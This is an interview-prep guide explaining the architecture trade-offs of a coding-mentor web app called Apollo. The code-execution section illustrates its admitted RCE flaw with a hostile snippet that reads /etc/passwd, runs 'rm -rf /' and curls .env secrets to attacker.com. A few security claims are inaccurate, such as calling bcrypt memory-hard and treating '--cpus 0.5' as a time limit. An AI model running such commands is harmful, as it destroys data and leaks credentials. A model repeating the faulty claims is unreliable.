# Phase 1: The "WHY" Layer — Mental Model & Trade-offs

> **Interview Pro-Tip:** Senior engineering interviews focus almost entirely on *why* you made each decision, not *what* you built. Answering "because I know it" or "because it was popular" is a junior answer that kills offers. Answering "because it satisfied these specific technical constraints, and here is the exact trade-off I consciously accepted" is a senior answer. Every decision below follows one template:
>
> **Decision → Why this → Why not the alternative → Trade-off you accepted → Production fix if any**
>
> Memorize this template. Apply it to every technology in this project.

---

## 1. The Core Problem & Mental Model

**What does Apollo actually solve?**

There is a fundamental problem in how developers learn to code today. The two dominant approaches are both broken:

**Approach 1 — Passive Learning (YouTube, Docs, Courses):**
You watch someone else code. You read documentation. You follow tutorials where you copy-paste code that someone already figured out. The problem: you never receive feedback on *your* code. You never get told why *your* specific implementation is wrong, inefficient, or vulnerable. When you close the tutorial and open a blank editor, you freeze.

**Approach 2 — AI Code Generators (Copilot, ChatGPT, Cursor):**
These tools were built for *production velocity* — they write code for you. Ask ChatGPT to solve Two Sum and it gives you the optimal O(N) hash map solution in 10 seconds. This feels like learning. It is not. The moment you close the chat and face a blank editor again, you still cannot solve Two Sum yourself. Your pattern recognition has not been trained. Your debugging skills have not been exercised.

**Apollo's answer:**
Apollo is built for *learning and evaluation*, not production velocity. In Socratic mode, Apollo *refuses to give you the answer*. It asks you guiding questions until you discover the solution yourself. In Code Review mode, it critiques *your actual code* — the mess you actually wrote — not a clean hypothetical. In the Interview Simulator, it generates a real DSA problem, starts a 45-minute countdown, limits your code runs to 3, and evaluates you with a HIRED / NO HIRE verdict. This is the AI acting as a *mentor*, not a *ghostwriter*.

**The mental model — Four Pillars of Apollo:**
```
Pillar 1: WORKSPACE         Pillar 2: AI MENTORSHIP      Pillar 3: EXECUTION
────────────────────        ─────────────────────        ─────────────────────
How do we give the user     How do we make the AI        How do we run user
a real coding environment   behave differently for       code safely without
that feels professional?    different learning goals?    installing compilers?

Monaco Editor               Mode Engine (Factory)        Local exec (JS, Python)
(VS Code engine)            15+ System Prompts           Judge0 API (C++, Java)
Multi-language support      SSE Token Streaming          5-second timeout guard
Resizable panels            Conversation history         Temp file cleanup

Pillar 4: AUTH & IDENTITY
─────────────────────────
How do we know who the user
is and protect their data?

OTP email verification
bcrypt password hashing
JWT session management
Brevo HTTP email delivery
```

---

## 2. Backend Framework: Why Node.js + Express?

**Decision:** Node.js + Express over Python/FastAPI, Python/Django, or Java/Spring Boot.

### Why not Python/FastAPI?

Python is the *dominant* language in the AI/ML ecosystem. LangChain, Hugging Face, most LLM frameworks are Python-first. So why did you choose JavaScript?

**Reason 1 — Server-Sent Events are trivially simple in Express:**
The core technical feature of Apollo is SSE (Server-Sent Events) token streaming. In Express, implementing SSE is 4 lines of code:
```javascript
res.setHeader('Content-Type', 'text/event-stream');
res.setHeader('Cache-Control', 'no-cache');
res.setHeader('Connection', 'keep-alive');
res.write(`data: ${JSON.stringify({ text })}\n\n`);
```
In FastAPI, SSE requires importing `sse-starlette`, using `EventSourceResponse`, configuring an ASGI server (Uvicorn), and dealing with async generator syntax that is less intuitive than Node's native async iteration. Express gives you raw, direct control over the `res` object.

**Reason 2 — Unified JavaScript ecosystem across the entire stack:**
The frontend is React (JavaScript). The backend is Express (JavaScript). This means:
- One language to context-switch between. You are never mentally switching between JS arrow functions and Python comprehensions.
- Shared mental model for async patterns (`async/await`, Promises) between frontend and backend.
- Shared tooling (npm, VS Code, ESLint) across the whole project.
- In theory, logic like the Mode Engine's prompt strings could be shared as a package between frontend and backend without any transformation.

**Reason 3 — OpenAI and Groq have first-class Node.js SDKs:**
Look at your `package.json`:
```json
"openai": "^6.45.0",
"groq-sdk": "^1.1.2"
```
Both of these are official, maintained SDKs with full streaming support, `response_format` JSON mode, and feature parity with the Python equivalents. The argument "Python has better AI libraries" was true in 2022. It is much less true today.

**Reason 4 — Single runtime for deployment:**
Node.js is a single runtime. You `npm install` and run `node server.js`. Python apps require managing a virtual environment (`python -m venv env`), activating it (`source env/bin/activate`), dealing with dependency conflicts between numpy versions, and often installing OS-level packages (`apt-get install libpdf...`). On cloud platforms like Render, Node.js deployment is zero-friction: push to GitHub, platform detects Node, runs `npm install`, starts server.

**The Trade-off you accepted:**
> Python has a vastly richer data science and AI ecosystem. Libraries like `langchain`, `llama-index`, `transformers` (for running local models), `pandas`, `camelot` (PDF table extraction), and `sentence-transformers` (for semantic search and caching) are significantly more mature than their Node.js equivalents. If Apollo needed to run a local LLaMA model, fine-tune an embedding model, or perform advanced vector search, Python would have been the correct choice. We accepted this trade-off because Apollo's only AI need is *calling an API* — it never runs a model locally.

---

## 3. Database: Why MongoDB?

**Decision:** MongoDB (NoSQL document store) over PostgreSQL (relational SQL) or MySQL.

### The root of the decision: what does Apollo's data actually look like?

Apollo's primary data is **AI conversation histories**. Every time a user switches modes or starts a new chat, a new conversation begins. Each conversation is a variable-length array of messages. Each message has a role (`user` or `model`) and `content` (which could be 5 words or 5,000 words of Markdown-formatted code review). The content is completely unpredictable in structure — Socratic mode produces short questions, Code Review mode produces structured Markdown lists, the Code Visualizer mode produces JSON embedded in Markdown fences.

### Why not PostgreSQL?

If you tried to model conversation history in PostgreSQL:
```sql
CREATE TABLE sessions (
    id SERIAL PRIMARY KEY,
    user_id INT REFERENCES users(id),
    mode VARCHAR(50),
    created_at TIMESTAMP
);

CREATE TABLE messages (
    id SERIAL PRIMARY KEY,
    session_id INT REFERENCES sessions(id),
    role VARCHAR(10),         -- 'user' or 'model'
    content TEXT,             -- Could be 10 chars or 10,000 chars
    created_at TIMESTAMP
);
```
Retrieving a full conversation requires a JOIN:
```sql
SELECT m.role, m.content
FROM messages m
JOIN sessions s ON m.session_id = s.id
WHERE s.id = 42
ORDER BY m.created_at ASC;
```
This works for 100 users. At 100,000 users with 50 messages per session, this is a 5 million row `messages` table being JOINed constantly. You can add indexes, but you are fighting against the grain of the data.

### Why MongoDB is a natural fit:

In MongoDB, a conversation is one atomic document:
```json
{
  "_id": "64f2abc...",
  "userId": "507f1f77...",
  "mode": "socratic",
  "messages": [
    { "role": "user",  "content": "How do I reverse a linked list?" },
    { "role": "model", "content": "What do you think happens to the `next` pointer..." },
    { "role": "user",  "content": "It should point backwards?" }
  ],
  "createdAt": "2024-07-20T10:30:00Z"
}
```
One `findById()` returns the entire conversation. No JOIN. No ORDER BY. No N+1 query problem. The document maps exactly to what the frontend needs: an array of `{ role, content }` objects to render the chat UI.

The User document is equally natural:
```json
{
  "_id": "507f1f77...",
  "username": "arshiya",
  "email": "arsh@example.com",
  "password": "$2a$10$hashed...",
  "isVerified": true,
  "otp": undefined,
  "otpExpiry": undefined,
  "createdAt": "2024-07-01T00:00:00Z"
}
```
User lookup by email during login uses the `unique: true` index on the email field — an automatic B-Tree index created by Mongoose. This gives O(log N) lookup regardless of how many users you have.

**The Trade-off you accepted:**
> MongoDB does not enforce ACID transactions across multiple documents by default. If the server crashes after saving a User record but before completing another write (e.g., in a future feature that saves a welcome session), you could have inconsistent data. PostgreSQL's transaction support (`BEGIN; ...; COMMIT;`) makes this impossible. MongoDB *does* support multi-document transactions since v4.0, but using them adds complexity that was deliberately skipped as an MVP simplification. For a production system handling financial data or critical state, this would need to be addressed.

---

## 4. AI Provider: Why OpenAI SDK with gpt-4o-mini?

**Decision:** OpenAI SDK (`gpt-4o-mini` model) over the Google Gemini SDK, Anthropic Claude, or any other provider.

### The resume discrepancy — address this proactively:

Your `package.json` contains `"openai": "^6.45.0"`. Your `config/ai.js` creates an `OpenAI` client. Your `aiService.js` uses `const MODEL = 'gpt-4o-mini'`. Yet your resume, README, and landing page say "Gemini AI." This **will** be called out by any technically literate interviewer who looks at your code.

**Do not be defensive about this. Own it completely:**

> "I originally integrated the Google Gemini API. The UI was designed around it and the branding reflected it. During development and load testing, I repeatedly hit Gemini's free tier rate limits — 15 requests per minute on the free tier, which is exhausted in seconds during active development. Because I had deliberately designed `aiService.js` as a thin, provider-agnostic wrapper where the model name and SDK import were isolated in two places (the `import` at line 1 and the `MODEL` constant at line 4), I was able to swap the entire underlying AI provider to OpenAI in approximately 5 minutes. Every single frontend component, mode engine prompt, SSE streaming controller, and test case generator continued to work without a single line change. The system prompt architecture in `modeEngine.js` is completely model-agnostic — it works identically whether the backend calls Gemini, GPT-4, or Claude. This is exactly the value of building with an abstraction layer: the UI contract (streaming text tokens) never changed, only the internal implementation did."

Also note: your `package.json` includes `"groq-sdk": "^1.1.2"` — you also have Groq integrated or explored, which further demonstrates provider flexibility.

### Why gpt-4o-mini specifically (not gpt-4o)?

| Model | Input Token Cost | Output Token Cost | Speed | Use Case |
|---|---|---|---|---|
| `gpt-4o` | $5.00 / 1M tokens | $15.00 / 1M tokens | ~2-4s first token | Complex reasoning, STEM problems |
| `gpt-4o-mini` | $0.15 / 1M tokens | $0.60 / 1M tokens | <1s first token | Code tutoring, explanation, review |

`gpt-4o-mini` is **33× cheaper** and **3× faster** for first token than `gpt-4o`. For Apollo's use cases — explaining a for loop, roasting variable naming, asking Socratic questions — `gpt-4o-mini` performs identically to `gpt-4o`. You only need `gpt-4o`'s full reasoning power for genuinely hard multi-step mathematical problems or complex system design analysis.

**The Trade-off you accepted:**
> `gpt-4o-mini` is less capable on deeply complex multi-step reasoning. In the Interview Evaluator mode, when scoring a candidate's code quality, `gpt-4o` would produce more nuanced, accurate assessments. In the Socratic Coach mode on a very hard DSA problem (e.g., Dijkstra's algorithm), `gpt-4o-mini`'s guiding questions might be shallower. For an MVP portfolio project, this is acceptable. In production with paying users, we would implement a tiered model strategy: use `gpt-4o-mini` by default, upgrade to `gpt-4o` for specific high-stakes modes like the Interview Evaluator.

---

## 5. Code Editor: Why Monaco Editor?

**Decision:** Monaco Editor (`@monaco-editor/react`) over CodeMirror, Ace Editor, or a plain `<textarea>`.

### Why not a plain `<textarea>`?
A `<textarea>` is a blank text box. No syntax highlighting. No bracket matching. No auto-indentation. No IntelliSense. No line numbers. It would make Apollo feel like a notepad, not a coding workspace. When you tell an interviewer you used Monaco, the implication is a professional, VS Code-level experience.

### Why not CodeMirror 6?
CodeMirror 6 is an excellent, modern, highly customizable editor. Many serious coding platforms use it (Replit uses CodeMirror). It is significantly lighter (~300KB) than Monaco. So why Monaco?

**Reason 1 — The "VS Code engine" talking point:**
Monaco is the exact editor engine that powers VS Code — the most used code editor in the world. Saying "I used the same editor engine as VS Code" immediately communicates quality to any developer interviewer. It is a shorthand for: this supports IntelliSense, this has production-tested syntax highlighting for 50+ languages, this has been battle-tested by millions of developers.

**Reason 2 — Out-of-the-box TypeScript IntelliSense:**
Monaco has native TypeScript language server support. It provides type inference, auto-complete for standard library methods, hover documentation, and error squiggles without any extra configuration. CodeMirror requires manually wiring up Language Server Protocol (LSP) packages to get equivalent functionality.

**Reason 3 — React wrapper is maintained by the official Monaco team:**
`@monaco-editor/react` is the official React integration. It handles the complex lifecycle management of mounting and unmounting the Monaco editor within React's rendering model, without memory leaks.

**The Trade-off you accepted:**
> Monaco's JavaScript bundle is ~2MB minified. CodeMirror 6's core is ~300KB. For users on slow connections, Monaco adds noticeable load time. For a mobile-first application, Monaco is genuinely too heavy and CodeMirror would be the correct choice. Apollo is designed as a desktop-first professional workspace — users are assumed to be developers on decent hardware with reasonable internet connections. The bundle weight is acceptable for that target user.

---

## 6. Real-Time AI: Why SSE and Not WebSockets?

**Decision:** Server-Sent Events (SSE) for AI streaming, not WebSockets (`ws://`).

### Understanding the core distinction:

| Feature | SSE | WebSockets |
|---|---|---|
| Direction | Server → Client only | Fully bidirectional |
| Protocol | Standard HTTP/1.1 | Protocol upgrade to `ws://` |
| Reconnection | Automatic (browser built-in) | Manual (you write reconnect logic) |
| Load balancing | Trivial (standard HTTP LB) | Complex (sticky sessions required) |
| Server resources | Connection held only during stream | Connection held for entire session lifetime |
| Browser API | `EventSource` or `fetch ReadableStream` | `new WebSocket(url)` |
| Firewalls/Proxies | Always works (port 443) | Sometimes blocked by corporate proxies |

### Why SSE is the correct choice for AI chat:

The AI streaming pattern is fundamentally unidirectional by nature:
1. User types a question (one standard HTTP POST).
2. Server starts streaming the response — hundreds of text tokens over 2-10 seconds.
3. User does not send any data while the response is streaming.
4. Stream ends. User reads the response.
5. User types the next question. Repeat.

This is a classic Server-Push pattern. The user is not sending data to the server while the response is coming. SSE is designed *exactly* for this pattern.

WebSockets would require:
- Persistent connection held open for the entire user session (hours).
- Custom message framing protocol (you define what a "chunk" message looks like).
- Manual reconnect logic when the connection drops.
- Sticky session configuration on any load balancer so a user's messages always route to the same server.
- More server memory (one open file descriptor per connected user for the duration of their session, not just during active streaming).

**Why NOT WebSockets:**
If 10,000 users have Apollo open, with WebSockets that is 10,000 persistent file descriptors held open simultaneously. With SSE, the connection only exists during the active stream — maybe 10 seconds per question. Between questions, there is no persistent connection to maintain.

**The exact implementation you used (not WebSockets, but fetch ReadableStream):**
Your `api.js` actually uses `fetch()` with `response.body.getReader()`, not the browser's native `EventSource` API. This is a subtle distinction:
- The native `EventSource` API only supports GET requests. Your AI endpoint is POST.
- `fetch ReadableStream` supports any HTTP method, full request body, and custom headers.
- Both receive the same SSE wire format (`data: ...\n\n`). The parsing logic in `api.js` manually splits on `\n` and strips the `data: ` prefix, which is exactly what `EventSource` does automatically.

**The Trade-off you accepted:**
> SSE cannot send data from client to server during a stream. If you wanted a "Stop Generating" button that interrupts the AI mid-response, you cannot signal this interruption through the SSE channel. You would need a separate mechanism: either an `AbortController` on the frontend (which closes the reader and triggers `req.on('close')` on the backend), or a separate REST endpoint like `POST /api/ai/cancel`. Currently, neither is implemented — closing the browser mid-stream wastes OpenAI API tokens.

---

## 7. Code Execution: Why Local exec + Judge0 Hybrid?

**Decision:** `child_process.exec` locally for JavaScript and Python; Judge0 API for C++ and Java.

### Why not a single uniform approach?

**Option A — Judge0 for everything:**
Judge0 is a cloud-based code execution API that runs code in isolated Docker containers. It supports 60+ languages. It sounds perfect. The problem: the free public API (`ce.judge0.com`) has severe rate limits — approximately 100 submissions per day. During development, testing, and demo sessions, you exhaust this in 20 minutes. If you demo Apollo to a recruiter and the code runner is rate-limited, your demo is broken.

**Option B — Local execution for everything:**
Run all code locally using `child_process.exec`. This gives unlimited, instant execution. The fatal problem: C++ and Java require compiler toolchains (`g++`, `javac`, JVM) to be installed on every machine the server runs on. These are large system-level installations that:
- Don't exist on most cloud platforms by default.
- Require `Dockerfile` configuration or OS package installation (`apt-get install g++ default-jdk`).
- Add enormous deployment complexity for a portfolio project.

**Option C — The hybrid (what Apollo does):**
JavaScript → local `exec node`. Python → local `exec python3`. Both are interpreted, have zero toolchain dependencies (Node.js is already running the server; Python is installed on virtually every system). C++ → Judge0. Java → Judge0. Only compiled languages that require heavy toolchains are outsourced to Judge0.

This is the correct engineering decision: optimize for the 80% case (JS and Python, which 80% of users will choose) with instant unlimited execution, and handle the 20% case (C++/Java) with the managed API.

### The Security Vulnerability — Own This Completely:

Local `child_process.exec` is a **Remote Code Execution (RCE)** vulnerability. A malicious user can submit this as their "code":

```javascript
// Malicious code submitted via the editor
const { execSync } = require('child_process');
execSync('cat /etc/passwd');              // Read server secrets
execSync('rm -rf /');                    // Destroy the server
execSync('curl attacker.com -d @.env'); // Exfiltrate your API keys
```

Your server will **execute this**. There is no sandbox. There is no protection.

**Why you built it this way anyway (the honest answer):**
> "I implemented local execution as a deliberate MVP trade-off. The alternative was to wait for Judge0's rate-limited API for every single JavaScript and Python run, which would have made the development workflow and demo experience frustratingly slow. I am fully aware this is an RCE attack surface that is completely unacceptable in a production environment. The production fix is to wrap local execution inside ephemeral, isolated Docker containers with these security constraints: no network access (`--network none`), read-only filesystem except `/tmp` (`--read-only`), 256MB memory limit (`--memory 256m`), 5-second CPU time limit (`--cpus 0.5`), and the `--no-new-privileges` flag to prevent privilege escalation. AWS Lambda and Firecracker microVMs (which power Lambda) achieve sub-100ms container cold starts, making this architecture viable for production."

**The `finally` block is important — understand why:**
```javascript
try {
  const { stdout, stderr } = await execAsync(`node "${tempFile}"`, { timeout: 5000 });
  return { stdout, stderr, exitCode: 0 };
} catch (err) {
  return { stdout: err.stdout || '', stderr: err.stderr || err.message, exitCode: err.code || 1 };
} finally {
  await fs.unlink(tempFile).catch(() => null); // ALWAYS runs — cleans up temp file
}
```
The `finally` block ensures the temp file in `os.tmpdir()` is always deleted — whether the code succeeds, throws an error, or times out. Without `finally`, failed executions would leave thousands of orphaned temp files on the server's filesystem, eventually filling the disk. The `.catch(() => null)` inside `finally` silences errors from `unlink` itself (e.g., if the file was already deleted by the OS).

**The Trade-off you accepted:**
> Speed and development velocity over security. Completely unacceptable for production, completely understandable for an MVP portfolio project where you control who has access to the URL.

---

## 8. Authentication: Why Custom OTP + JWT and Not OAuth?

**Decision:** Custom OTP email verification + JWT tokens over Google/GitHub OAuth, Auth0, or Firebase Auth.

### Why not OAuth ("Sign in with Google")?

Using Google OAuth would mean integrating `passport.js` or `next-auth` and delegating the entire authentication flow to Google. This works, but:

1. **It teaches the interviewer nothing.** An interviewer looks at OAuth and sees a copy-paste integration. They learn nothing about your understanding of authentication fundamentals.
2. **You built the entire auth stack from scratch.** You know what a salt is, why bcrypt is intentionally slow, what `crypto.randomInt()` provides over `Math.random()`, how JWTs are structured and verified, why HTTP-Only cookies are safer than localStorage, and how to prevent OTP timing attacks. This demonstrates depth that OAuth integration does not.

**The interviewer-facing value of custom auth:**
> "I chose to implement the authentication flow from scratch — OTP generation, email delivery, password hashing, token issuance, and session management — because I wanted to deeply understand the security properties of each component rather than abstracting them away. Specifically: I used `crypto.randomInt()` for OTPs because `Math.random()` is not cryptographically secure (its output is predictable given the seed). I used bcrypt with 10 salt rounds because each additional round doubles the hashing time, making brute-force attacks exponentially harder. I issued JWTs signed with a secret key rather than symmetric session cookies because JWTs are stateless — the server can verify them without a database lookup on every request."

### Why bcrypt and Not SHA-256 or Argon2?

**Why not SHA-256:**
SHA-256 hashes approximately 10 **billion** times per second on modern hardware with GPU acceleration. A 8-character password with letters+numbers+symbols has ~62^8 ≈ 218 trillion combinations. At 10 billion hashes/second, an attacker cracks your entire password space in about 6 hours. SHA-256 is a fast hash — that is great for file integrity checks, terrible for passwords.

**Why bcrypt:**
`bcrypt.genSalt(10)` means 2^10 = 1,024 rounds of hashing internally. Each hash takes ~100ms on your server's CPU. An attacker cannot parallelize this on a GPU the same way because bcrypt is *memory-hard* (requires specific memory access patterns that GPUs are poor at). At 100ms per hash, cracking that same password space takes 690 years. Your `package.json` uses `bcryptjs` — the pure JavaScript implementation — which has no native compilation dependencies, making deployment simpler.

**Why not Argon2 (the theoretically superior choice):**
Argon2 won the Password Hashing Competition in 2015 and is considered the state-of-the-art password hashing algorithm. It is more memory-hard and parallelism-resistant than bcrypt. However, `argon2` npm package requires native C compilation (`node-gyp`). On some systems and CI environments, this compilation fails. `bcryptjs` is pure JavaScript — it deploys everywhere without native build steps. For a portfolio project, the deployment simplicity outweighs the marginal security improvement of Argon2.

### Why Brevo HTTP API and Not Raw Nodemailer SMTP?

Look at `authController.js`:
```javascript
const isBrevoAPI = process.env.EMAIL_PASS &&
  (process.env.EMAIL_PASS.startsWith('xsmtpsib-') ||
   process.env.EMAIL_PASS.startsWith('xkeysib-'));
```
The code detects whether the configured password is a Brevo API key (by its prefix pattern) and routes accordingly:
- **If Brevo API key detected**: Use Brevo's HTTP REST API (port 443 / HTTPS).
- **If not**: Fall back to Nodemailer SMTP (port 587 / STARTTLS).

**Why cloud platforms block SMTP:**
Standard SMTP ports — 25 (plain), 465 (SMTPS), 587 (STARTTLS) — are blocked by most cloud providers (AWS, Render, Heroku) at the infrastructure level. The reason: spam. In 2010, malicious apps on cloud servers flooded the internet with spam email. Cloud providers responded by blocking all outbound SMTP at the network level, with no exceptions for free/hobbyist tiers.

**Brevo's HTTP API uses port 443 (standard HTTPS).** Port 443 is never blocked — it is the same port as every website on the internet. Any HTTPS request from any cloud server to `api.brevo.com` succeeds.

**The dual-fallback design:**
If the Brevo API fails (network error, invalid API key, rate limit), the code catches the error and falls back to Nodemailer SMTP. This ensures email delivery degrades gracefully rather than failing completely.

**The Trade-off you accepted:**
> Dependence on Brevo's service availability and credit limits. If the Brevo API key expires or the monthly send limit is reached, OTP emails stop. In a production system, you would use a dedicated transactional email service (SendGrid, AWS SES) with alert monitoring on delivery rates.

---

## 9. Frontend: Why Vite and Not Create React App (CRA)?

**Decision:** Vite as the frontend build tool and dev server over Create React App.

### Why not CRA?
CRA was the default React starter for years. It uses Webpack internally, which:
- Takes 30-60 seconds to start in development on a large project.
- Takes another 20-40 seconds for every hot-reload after a code change.
- Generates a bloated configuration that is nearly impossible to customize without `eject`.

**Why Vite:**
Vite uses ES modules natively in the browser during development — no bundling step. It only compiles the specific module you changed. Result:
- Server starts in ~300ms.
- Hot Module Replacement (HMR) on code change: ~50ms.
- `import.meta.env` for environment variables (instead of CRA's `process.env` with `REACT_APP_` prefix).

This matters for your project because `api.js` uses:
```javascript
const API_BASE = import.meta.env.MODE === 'production'
  ? 'https://practium6.onrender.com'
  : 'http://localhost:5000';
```
This Vite-native pattern auto-switches the API base URL based on build mode without any extra configuration.

**The Trade-off you accepted:**
> Vite's production build is slightly less battle-tested on extremely complex enterprise configurations than Webpack. For a standard React SPA like Apollo, this difference is irrelevant.

---

## 10. Why `type: "module"` (ESM) on the Backend?

Your `server/package.json` contains:
```json
"type": "module"
```
This switches Node.js from CommonJS (`require()` / `module.exports`) to ES Modules (`import` / `export`). You can see this throughout every server file:
```javascript
import express from 'express';     // ESM import
export default router;             // ESM export
export async function executeCode  // Named ESM export
```
Instead of the older CommonJS:
```javascript
const express = require('express');  // CJS
module.exports = router;             // CJS
```

**Why ESM:**
Unified syntax between frontend (React uses ESM natively) and backend. You write the same `import/export` syntax everywhere. No mental context-switch. ESM is also the direction the entire JavaScript ecosystem is moving — Node.js's own documentation recommends ESM for new projects.

**The Trade-off you accepted:**
> Some older npm packages are CommonJS-only and cannot be directly `import`-ed from an ESM module without special handling. This is rare with modern packages but can cause confusing `Error [ERR_REQUIRE_ESM]` errors if you try to use a very old library.

---

## 11. Why No Redux? Why React Context Only?

**Decision:** React's built-in `createContext` + `useContext` for global auth state over Redux, Zustand, or MobX.

Apollo has exactly **one** piece of truly global state: `{ user, token, login, logout }` — whether the current user is authenticated and who they are.

**Why this does not need Redux:**
Redux is designed for:
- Complex state that many unrelated components need to read and mutate.
- State with complex update logic (reducers).
- Time-travel debugging and redux-devtools inspection.
- State that is frequently mutated by many different action types.

Apollo's auth state is updated exactly twice: `login()` (on successful auth) and `logout()` (on signout). That is it. There is no complex reducer needed. There is no state that 15 different components all need to independently mutate. A `createContext` + `useContext` pattern with a `useState` inside the Provider is 48 lines of code (your `AuthContext.jsx`) and covers every requirement exactly.

Everything else in Apollo (chat messages, code content, active mode, test cases, timer state) is *local* component state — it belongs in the `useState` of the page component that owns it, not in a global store.

**The Trade-off you accepted:**
> Context API has a known performance limitation: any component that calls `useContext(AuthContext)` will re-render whenever the context value changes. If the auth context stored frequently-changing data (like a live typing indicator or a real-time counter), this would cause excessive re-renders across the whole app. For auth state that only changes on login and logout, this is completely irrelevant.

---

## 12. Quick-Reference Trade-offs Card

Print this. Memorize it. Use it.

| Question | Decision | One-line Defense | One-line Trade-off |
|---|---|---|---|
| "Why Node.js?" | Unified JS stack, raw SSE control | Express `res.write()` is 1 line for SSE streaming | Python has richer local AI libraries |
| "Why MongoDB?" | Chat logs are polymorphic JSON | One document = one conversation. Zero JOINs | No ACID multi-document transactions by default |
| "Why OpenAI?" | Provider-agnostic wrapper swapped Gemini → OpenAI in 5 min | Rate limits, wrapper architecture | $0.15/1M tokens, less capable than gpt-4o on hard reasoning |
| "Why Monaco?" | VS Code engine, native IntelliSense | Same engine as VS Code, zero configuration | 2MB bundle vs CodeMirror's 300KB |
| "Why SSE?" | AI streaming is unidirectional server-push | Stateless HTTP, no sticky sessions, lower resource overhead | Cannot interrupt mid-stream without AbortController |
| "Why local exec?" | Instant unlimited JS/Python execution | Zero latency, no rate limits | **Critical RCE vulnerability** — production needs Docker |
| "Why Judge0?" | Sandboxed C++/Java without local toolchain | Cloud-managed compiler sandbox | 100/day rate limit, 1-15s latency |
| "Why bcrypt?" | Intentionally slow to prevent brute-force | 10 rounds = ~100ms/hash, GPU-resistant | Adds ~100ms to login — async to avoid blocking Event Loop |
| "Why Brevo HTTP?" | SMTP ports blocked by cloud providers | Port 443 is never blocked | Dependent on Brevo credits and API availability |
| "Why custom OTP?" | Teaches auth fundamentals, full control | Deep understanding of the complete auth stack | More user friction than OAuth |
| "Why Vite?" | Instant HMR, 300ms dev server startup | No bundling step in dev, `import.meta.env` native | Slightly less Webpack ecosystem tooling for edge cases |
| "Why Context not Redux?" | Auth state changes exactly twice: login and logout | 48 lines vs 500+ lines of Redux boilerplate | Context re-renders all consumers on any value change |
